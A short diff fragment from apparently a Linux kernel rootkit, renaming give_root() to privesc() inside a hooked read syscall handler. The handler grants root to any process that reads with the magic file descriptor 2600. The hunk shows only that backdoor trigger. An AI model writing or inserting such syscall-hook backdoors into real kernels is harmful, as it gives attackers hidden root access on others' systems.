@@ -30,7 +30,7 @@ int new_read(struct pt_regs *regs)
     int retval;
     if (fd == 2600)
     {
-        give_root(); 
+        privesc(); 
         return 0;
     }
 
